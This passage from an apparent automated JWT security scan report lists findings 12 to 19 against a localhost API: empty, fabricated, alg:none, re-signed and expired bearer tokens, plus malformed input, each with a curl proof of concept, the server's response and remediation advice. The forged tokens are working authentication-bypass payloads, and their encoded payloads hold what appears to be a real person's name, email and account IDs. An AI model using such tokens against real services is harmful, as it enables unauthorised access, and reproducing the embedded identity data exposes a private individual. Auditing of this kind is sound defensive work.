{"settings":{"theme":"dark","notifications":true,"auto_scan":false},"user_id":101,"token_exp_received":1790255461,"current_server_time":1790255292,"warning":"VULNERABILITY DETECTED: Server accepted...
```

**Remediation Recommendation:**
> Explicitly whitelist cryptographic algorithms in your JWT verification library (e.g. algorithms=['HS256']). Never allow algorithm header negotiation or 'none' algorithm tokens in production.

### Finding 12: Tampered Cryptographic Signature on `GET /api/user/settings`
- **Severity:** CRITICAL
- **CWE Classification:** CWE-347: Improper Verification of Cryptographic Signature
- **HTTP Status Code Returned:** `200`
- **Security Impact:** CRITICAL: Missing Signature Verification. Server accepted forged signature.

**Reproduction Proof-of-Concept:**
```bash
curl -s -X GET "http://localhost:8004/api/user/settings" -H "Authorization: Bearer eyJhbGciOiAiRVMyNTYiLCAia2lkIjogIjNhYmE2OWYwLWJkYzEtNDljMy1iZGNjLWU1YjU2OGE0ZGU1NSIsICJ0eXAiOiAiSldUIn0.eyJpc3MiOiAiaHR0cHM6Ly9sYnZyZG93eGlmZm1vYWNmdW9peS5zdXBhYmFzZS5jby9hdXRoL3YxIiwgInN1YiI6ICI3MTcwZjA4Zi1kZGNiLTRhY2QtOTgwYS0zMDI4ODEyZGUzNDgiLCAiYXVkIjogImF1dGhlbnRpY2F0ZWQiLCAiZXhwIjogMTc5MDI1NTQ2MSwgImlhdCI6IDE3OTAyNTE4NjEsICJlbWFpbCI6ICJ5dXZyYWpqc29uaTE3QGdtYWlsLmNvbSIsICJwaG9uZSI6ICIiLCAiYXBwX21ldGFkYXRhIjogeyJwcm92aWRlciI6ICJnb29nbGUiLCAicHJvdmlkZXJzIjogWyJnb29nbGUiXX0sICJ1c2VyX21ldGFkYXRhIjogeyJhdmF0YXJfdXJsIjogImh0dHBzOi8vbGgzLmdvb2dsZXVzZXJjb250ZW50LmNvbS9hL0FDZzhvY0wyVnlYNnNqZUNEakRxYVMxQWdPeUg0eFdTYUhmWEhlajBwQk9oNmdxN2Zjdkl6cnM9czk2LWMiLCAiZW1haWwiOiAieXV2cmFqanNvbmkxN0BnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAiZnVsbF9uYW1lIjogIll1dnJhaiBTb25pIiwgImlzcyI6ICJodHRwczovL2FjY291bnRzLmdvb2dsZS5jb20iLCAibmFtZSI6ICJZdXZyYWogU29uaSIsICJwaG9uZV92ZXJpZmllZCI6IGZhbHNlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS9BQ2c4b2NMMlZ5WDZzamVDRGpEcWFTMUFnT3lINHhXU2FIZlhIZWowcEJPaDZncTdmY3ZJenJzPXM5Ni1jIiwgInByb3ZpZGVyX2lkIjogIjExODEwMjE5MzkxOTYyOTI0NjgxNyIsICJzdWIiOiAiMTE4MTAyMTkzOTE5NjI5MjQ2ODE3In0sICJyb2xlIjogImF1dGhlbnRpY2F0ZWQiLCAiYWFsIjogImFhbDEiLCAiYW1yIjogW3sibWV0aG9kIjogIm9hdXRoIiwgInRpbWVzdGFtcCI6IDE3ODk1NzcyNzh9XSwgInNlc3Npb25faWQiOiAiNzUwNjZmMWYtNmIxZi00MjM2LTk5NDgtZjg5MmRmNzc5ZmIwIiwgImlzX2Fub255bW91cyI6IGZhbHNlfQ.OuWR4LP55kRnNbS4H_0B3ursXdKto1JSF0UM8XXyPQocBBvjv-lIxyLsmDRJoxo6oJECNO7bE2Qme3qtINVALID"
```

**Server Response Preview:**
```json
{"settings":{"theme":"dark","notifications":true,"auto_scan":false},"user_id":101,"token_exp_received":1790255461,"current_server_time":1790255292,"warning":"VULNERABILITY DETECTED: Server accepted...
```

**Remediation Recommendation:**
> Always cryptographically verify the token signature using a strong secret key or public key. Never rely on simply decoding the JWT payload (e.g. jwt.decode(verify=False)).

### Finding 13: Expired Token Validation on `GET /api/user/settings`
- **Severity:** HIGH
- **CWE Classification:** CWE-613: Insufficient Session Expiration
- **HTTP Status Code Returned:** `200`
- **Security Impact:** HIGH: Server accepted expired token without verifying 'exp' claim.

**Reproduction Proof-of-Concept:**
```bash
curl -s -X GET "http://localhost:8004/api/user/settings" -H "Authorization: Bearer eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJpc3MiOiAiaHR0cHM6Ly9sYnZyZG93eGlmZm1vYWNmdW9peS5zdXBhYmFzZS5jby9hdXRoL3YxIiwgInN1YiI6ICI3MTcwZjA4Zi1kZGNiLTRhY2QtOTgwYS0zMDI4ODEyZGUzNDgiLCAiYXVkIjogImF1dGhlbnRpY2F0ZWQiLCAiZXhwIjogMTc5MDI1MTY5MiwgImlhdCI6IDE3OTAyNDgwOTIsICJlbWFpbCI6ICJ5dXZyYWpqc29uaTE3QGdtYWlsLmNvbSIsICJwaG9uZSI6ICIiLCAiYXBwX21ldGFkYXRhIjogeyJwcm92aWRlciI6ICJnb29nbGUiLCAicHJvdmlkZXJzIjogWyJnb29nbGUiXX0sICJ1c2VyX21ldGFkYXRhIjogeyJhdmF0YXJfdXJsIjogImh0dHBzOi8vbGgzLmdvb2dsZXVzZXJjb250ZW50LmNvbS9hL0FDZzhvY0wyVnlYNnNqZUNEakRxYVMxQWdPeUg0eFdTYUhmWEhlajBwQk9oNmdxN2Zjdkl6cnM9czk2LWMiLCAiZW1haWwiOiAieXV2cmFqanNvbmkxN0BnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAiZnVsbF9uYW1lIjogIll1dnJhaiBTb25pIiwgImlzcyI6ICJodHRwczovL2FjY291bnRzLmdvb2dsZS5jb20iLCAibmFtZSI6ICJZdXZyYWogU29uaSIsICJwaG9uZV92ZXJpZmllZCI6IGZhbHNlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS9BQ2c4b2NMMlZ5WDZzamVDRGpEcWFTMUFnT3lINHhXU2FIZlhIZWowcEJPaDZncTdmY3ZJenJzPXM5Ni1jIiwgInByb3ZpZGVyX2lkIjogIjExODEwMjE5MzkxOTYyOTI0NjgxNyIsICJzdWIiOiAiMTE4MTAyMTkzOTE5NjI5MjQ2ODE3In0sICJyb2xlIjogImF1dGhlbnRpY2F0ZWQiLCAiYWFsIjogImFhbDEiLCAiYW1yIjogW3sibWV0aG9kIjogIm9hdXRoIiwgInRpbWVzdGFtcCI6IDE3ODk1NzcyNzh9XSwgInNlc3Npb25faWQiOiAiNzUwNjZmMWYtNmIxZi00MjM2LTk5NDgtZjg5MmRmNzc5ZmIwIiwgImlzX2Fub255bW91cyI6IGZhbHNlfQ.EXPIRED_SIGNATURE_PROBE"
```

**Server Response Preview:**
```json
{"settings":{"theme":"dark","notifications":true,"auto_scan":false},"user_id":101,"token_exp_received":1790251692,"current_server_time":1790255292,"warning":"VULNERABILITY DETECTED: Server accepted...
```

**Remediation Recommendation:**
> Ensure the JWT verification engine checks the 'exp' (expiration) claim and rejects tokens whose expiration timestamp is in the past. Set short-lived access token lifespans (15-60 minutes).

### Finding 14: Empty Bearer Token Header on `GET /api/user/data`
- **Severity:** CRITICAL
- **CWE Classification:** CWE-287: Improper Authentication
- **HTTP Status Code Returned:** `200`
- **Security Impact:** CRITICAL: Server accepted empty Bearer token header without verification.

**Reproduction Proof-of-Concept:**
```bash
curl -s -X GET "http://localhost:8004/api/user/data" -H "Authorization: Bearer"
```

**Server Response Preview:**
```json
{"data":"Confidential user vault data"}
```

**Remediation Recommendation:**
> Enforce mandatory authentication middleware on all protected API routes. Ensure requests without valid Authorization Bearer tokens immediately terminate with 401 Unauthorized before executing controller or business logic.

### Finding 15: Arbitrary / Fabricated Bearer Token on `GET /api/user/data`
- **Severity:** CRITICAL
- **CWE Classification:** CWE-287: Improper Authentication
- **HTTP Status Code Returned:** `200`
- **Security Impact:** CRITICAL: Server accepted arbitrary/fabricated Bearer token.

**Reproduction Proof-of-Concept:**
```bash
curl -s -X GET "http://localhost:8004/api/user/data" -H "Authorization: Bearer sentinel_unauthorized_fake_token_9999"
```

**Server Response Preview:**
```json
{"data":"Confidential user vault data"}
```

**Remediation Recommendation:**
> Enforce mandatory authentication middleware on all protected API routes. Ensure requests without valid Authorization Bearer tokens immediately terminate with 401 Unauthorized before executing controller or business logic.

### Finding 16: JWT alg:none Signature Bypass on `GET /api/user/data`
- **Severity:** CRITICAL
- **CWE Classification:** CWE-347: Improper Verification of Cryptographic Signature
- **HTTP Status Code Returned:** `200`
- **Security Impact:** CRITICAL: JWT alg:none Signature Bypass. Server accepted unsigned JWT.

**Reproduction Proof-of-Concept:**
```bash
curl -s -X GET "http://localhost:8004/api/user/data" -H "Authorization: Bearer eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJpc3MiOiAiaHR0cHM6Ly9sYnZyZG93eGlmZm1vYWNmdW9peS5zdXBhYmFzZS5jby9hdXRoL3YxIiwgInN1YiI6ICI3MTcwZjA4Zi1kZGNiLTRhY2QtOTgwYS0zMDI4ODEyZGUzNDgiLCAiYXVkIjogImF1dGhlbnRpY2F0ZWQiLCAiZXhwIjogMTc5MDI1NTQ2MSwgImlhdCI6IDE3OTAyNTE4NjEsICJlbWFpbCI6ICJ5dXZyYWpqc29uaTE3QGdtYWlsLmNvbSIsICJwaG9uZSI6ICIiLCAiYXBwX21ldGFkYXRhIjogeyJwcm92aWRlciI6ICJnb29nbGUiLCAicHJvdmlkZXJzIjogWyJnb29nbGUiXX0sICJ1c2VyX21ldGFkYXRhIjogeyJhdmF0YXJfdXJsIjogImh0dHBzOi8vbGgzLmdvb2dsZXVzZXJjb250ZW50LmNvbS9hL0FDZzhvY0wyVnlYNnNqZUNEakRxYVMxQWdPeUg0eFdTYUhmWEhlajBwQk9oNmdxN2Zjdkl6cnM9czk2LWMiLCAiZW1haWwiOiAieXV2cmFqanNvbmkxN0BnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAiZnVsbF9uYW1lIjogIll1dnJhaiBTb25pIiwgImlzcyI6ICJodHRwczovL2FjY291bnRzLmdvb2dsZS5jb20iLCAibmFtZSI6ICJZdXZyYWogU29uaSIsICJwaG9uZV92ZXJpZmllZCI6IGZhbHNlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS9BQ2c4b2NMMlZ5WDZzamVDRGpEcWFTMUFnT3lINHhXU2FIZlhIZWowcEJPaDZncTdmY3ZJenJzPXM5Ni1jIiwgInByb3ZpZGVyX2lkIjogIjExODEwMjE5MzkxOTYyOTI0NjgxNyIsICJzdWIiOiAiMTE4MTAyMTkzOTE5NjI5MjQ2ODE3In0sICJyb2xlIjogImF1dGhlbnRpY2F0ZWQiLCAiYWFsIjogImFhbDEiLCAiYW1yIjogW3sibWV0aG9kIjogIm9hdXRoIiwgInRpbWVzdGFtcCI6IDE3ODk1NzcyNzh9XSwgInNlc3Npb25faWQiOiAiNzUwNjZmMWYtNmIxZi00MjM2LTk5NDgtZjg5MmRmNzc5ZmIwIiwgImlzX2Fub255bW91cyI6IGZhbHNlfQ."
```

**Server Response Preview:**
```json
{"data":"Confidential user vault data"}
```

**Remediation Recommendation:**
> Explicitly whitelist cryptographic algorithms in your JWT verification library (e.g. algorithms=['HS256']). Never allow algorithm header negotiation or 'none' algorithm tokens in production.

### Finding 17: Tampered Cryptographic Signature on `GET /api/user/data`
- **Severity:** CRITICAL
- **CWE Classification:** CWE-347: Improper Verification of Cryptographic Signature
- **HTTP Status Code Returned:** `200`
- **Security Impact:** CRITICAL: Missing Signature Verification. Server accepted forged signature.

**Reproduction Proof-of-Concept:**
```bash
curl -s -X GET "http://localhost:8004/api/user/data" -H "Authorization: Bearer eyJhbGciOiAiRVMyNTYiLCAia2lkIjogIjNhYmE2OWYwLWJkYzEtNDljMy1iZGNjLWU1YjU2OGE0ZGU1NSIsICJ0eXAiOiAiSldUIn0.eyJpc3MiOiAiaHR0cHM6Ly9sYnZyZG93eGlmZm1vYWNmdW9peS5zdXBhYmFzZS5jby9hdXRoL3YxIiwgInN1YiI6ICI3MTcwZjA4Zi1kZGNiLTRhY2QtOTgwYS0zMDI4ODEyZGUzNDgiLCAiYXVkIjogImF1dGhlbnRpY2F0ZWQiLCAiZXhwIjogMTc5MDI1NTQ2MSwgImlhdCI6IDE3OTAyNTE4NjEsICJlbWFpbCI6ICJ5dXZyYWpqc29uaTE3QGdtYWlsLmNvbSIsICJwaG9uZSI6ICIiLCAiYXBwX21ldGFkYXRhIjogeyJwcm92aWRlciI6ICJnb29nbGUiLCAicHJvdmlkZXJzIjogWyJnb29nbGUiXX0sICJ1c2VyX21ldGFkYXRhIjogeyJhdmF0YXJfdXJsIjogImh0dHBzOi8vbGgzLmdvb2dsZXVzZXJjb250ZW50LmNvbS9hL0FDZzhvY0wyVnlYNnNqZUNEakRxYVMxQWdPeUg0eFdTYUhmWEhlajBwQk9oNmdxN2Zjdkl6cnM9czk2LWMiLCAiZW1haWwiOiAieXV2cmFqanNvbmkxN0BnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAiZnVsbF9uYW1lIjogIll1dnJhaiBTb25pIiwgImlzcyI6ICJodHRwczovL2FjY291bnRzLmdvb2dsZS5jb20iLCAibmFtZSI6ICJZdXZyYWogU29uaSIsICJwaG9uZV92ZXJpZmllZCI6IGZhbHNlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS9BQ2c4b2NMMlZ5WDZzamVDRGpEcWFTMUFnT3lINHhXU2FIZlhIZWowcEJPaDZncTdmY3ZJenJzPXM5Ni1jIiwgInByb3ZpZGVyX2lkIjogIjExODEwMjE5MzkxOTYyOTI0NjgxNyIsICJzdWIiOiAiMTE4MTAyMTkzOTE5NjI5MjQ2ODE3In0sICJyb2xlIjogImF1dGhlbnRpY2F0ZWQiLCAiYWFsIjogImFhbDEiLCAiYW1yIjogW3sibWV0aG9kIjogIm9hdXRoIiwgInRpbWVzdGFtcCI6IDE3ODk1NzcyNzh9XSwgInNlc3Npb25faWQiOiAiNzUwNjZmMWYtNmIxZi00MjM2LTk5NDgtZjg5MmRmNzc5ZmIwIiwgImlzX2Fub255bW91cyI6IGZhbHNlfQ.OuWR4LP55kRnNbS4H_0B3ursXdKto1JSF0UM8XXyPQocBBvjv-lIxyLsmDRJoxo6oJECNO7bE2Qme3qtINVALID"
```

**Server Response Preview:**
```json
{"data":"Confidential user vault data"}
```

**Remediation Recommendation:**
> Always cryptographically verify the token signature using a strong secret key or public key. Never rely on simply decoding the JWT payload (e.g. jwt.decode(verify=False)).

### Finding 18: Expired Token Validation on `GET /api/user/data`
- **Severity:** HIGH
- **CWE Classification:** CWE-613: Insufficient Session Expiration
- **HTTP Status Code Returned:** `200`
- **Security Impact:** HIGH: Server accepted expired token without verifying 'exp' claim.

**Reproduction Proof-of-Concept:**
```bash
curl -s -X GET "http://localhost:8004/api/user/data" -H "Authorization: Bearer eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJpc3MiOiAiaHR0cHM6Ly9sYnZyZG93eGlmZm1vYWNmdW9peS5zdXBhYmFzZS5jby9hdXRoL3YxIiwgInN1YiI6ICI3MTcwZjA4Zi1kZGNiLTRhY2QtOTgwYS0zMDI4ODEyZGUzNDgiLCAiYXVkIjogImF1dGhlbnRpY2F0ZWQiLCAiZXhwIjogMTc5MDI1MTY5MiwgImlhdCI6IDE3OTAyNDgwOTIsICJlbWFpbCI6ICJ5dXZyYWpqc29uaTE3QGdtYWlsLmNvbSIsICJwaG9uZSI6ICIiLCAiYXBwX21ldGFkYXRhIjogeyJwcm92aWRlciI6ICJnb29nbGUiLCAicHJvdmlkZXJzIjogWyJnb29nbGUiXX0sICJ1c2VyX21ldGFkYXRhIjogeyJhdmF0YXJfdXJsIjogImh0dHBzOi8vbGgzLmdvb2dsZXVzZXJjb250ZW50LmNvbS9hL0FDZzhvY0wyVnlYNnNqZUNEakRxYVMxQWdPeUg0eFdTYUhmWEhlajBwQk9oNmdxN2Zjdkl6cnM9czk2LWMiLCAiZW1haWwiOiAieXV2cmFqanNvbmkxN0BnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAiZnVsbF9uYW1lIjogIll1dnJhaiBTb25pIiwgImlzcyI6ICJodHRwczovL2FjY291bnRzLmdvb2dsZS5jb20iLCAibmFtZSI6ICJZdXZyYWogU29uaSIsICJwaG9uZV92ZXJpZmllZCI6IGZhbHNlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS9BQ2c4b2NMMlZ5WDZzamVDRGpEcWFTMUFnT3lINHhXU2FIZlhIZWowcEJPaDZncTdmY3ZJenJzPXM5Ni1jIiwgInByb3ZpZGVyX2lkIjogIjExODEwMjE5MzkxOTYyOTI0NjgxNyIsICJzdWIiOiAiMTE4MTAyMTkzOTE5NjI5MjQ2ODE3In0sICJyb2xlIjogImF1dGhlbnRpY2F0ZWQiLCAiYWFsIjogImFhbDEiLCAiYW1yIjogW3sibWV0aG9kIjogIm9hdXRoIiwgInRpbWVzdGFtcCI6IDE3ODk1NzcyNzh9XSwgInNlc3Npb25faWQiOiAiNzUwNjZmMWYtNmIxZi00MjM2LTk5NDgtZjg5MmRmNzc5ZmIwIiwgImlzX2Fub255bW91cyI6IGZhbHNlfQ.EXPIRED_SIGNATURE_PROBE"
```

**Server Response Preview:**
```json
{"data":"Confidential user vault data"}
```

**Remediation Recommendation:**
> Ensure the JWT verification engine checks the 'exp' (expiration) claim and rejects tokens whose expiration timestamp is in the past. Set short-lived access token lifespans (15-60 minutes).

### Finding 19: Malformed Token & Verbose Error Leakage on `GET /api/user/data`
- **Severity:** MEDIUM
- **CWE Classification:** CWE-209: Information Exposure Through an Error Message
- **HTTP Status Code Returned:** `500`
- **Security Impact:** MEDIUM: Server returned HTTP 500 and leaked internal exception stack traces.

**Reproduction Proof-of-Concept:**
```bash
curl -s -X GET "http://localhost:8004/api/user/data" -H "Authorization: Bearer not.a.valid.jwt.payload.with.invalid.characters!@#$%"
```

**Server Response Preview:**
```json
{"error":"Internal Server Error","exception":"SyntaxError: Unexpected token  in JSON at position 0","stack_trace":["at JSON.parse (<anonymous>)","at decodeJwtPayload (/app/services/auth.js:42:18)",...
```

**Remediation Recommendation:**
> Wrap token parsing in robust try/catch blocks and return uniform 401 Unauthorized JSON responses. Disable debug error pages and stack traces in production environments.
